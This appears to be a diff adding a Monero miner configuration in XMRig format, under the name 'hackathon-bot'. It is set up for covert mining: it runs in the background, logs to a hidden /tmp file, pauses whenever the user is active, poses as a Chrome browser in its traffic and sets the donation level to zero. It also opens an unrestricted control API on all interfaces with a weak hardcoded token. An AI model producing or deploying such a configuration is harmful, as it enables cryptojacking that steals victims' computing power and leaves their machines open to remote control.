@@ -1,0 +1,129 @@
+{
+    "api": {
+        "id": "hackathon-bot",
+        "worker-id": "bot-001"
+    },
+    "http": {
+        "enabled": true,
+        "host": "0.0.0.0",
+        "port": 8080,
+        "access-token": "SecretToken123",
+        "restricted": false
+    },
+    "autosave": false,
+    "background": true,
+    "colors": false,
+    "randomx": {
+        "mode": "light",
+        "1gb-pages": false,
+        "numa": true
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": false,
+        "priority": 2,
+        "max-threads-hint": 50,
+        "yield": true
+    },
+    "opencl": {
+        "enabled": false
+    },
+    "cuda": {
+        "enabled": false
+    },
+    "donate-level": 0,
+    "log-file": "/tmp/.miner.log",
+    "dns": {
+        "ipv6": false,
+        "ttl": 30,
+        "max-retry": 3,
+        "doh": {
+            "enabled": true,
+            "url": "https://1.1.1.1/dns-query",
+            "priority": 1
+        },
+        "servers": [
+            "1.1.1.1",
+            "8.8.8.8",
+            "9.9.9.9"
+        ]
+    },
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "xmrig.yourdomain.com:443",
+            "user": "YOUR_WALLET_ADDRESS",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": true,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        },
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "127.0.0.1:3333",
+            "user": "YOUR_WALLET_ADDRESS",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        },
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "pool.supportxmr.com:443",
+            "user": "YOUR_WALLET_ADDRESS",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": true,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        },
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "xmr.nanopool.org:14433",
+            "user": "YOUR_WALLET_ADDRESS",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": true,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "print-time": 180,
+    "retries": 10,
+    "retry-pause": 10,
+    "syslog": false,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": 30,
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+}
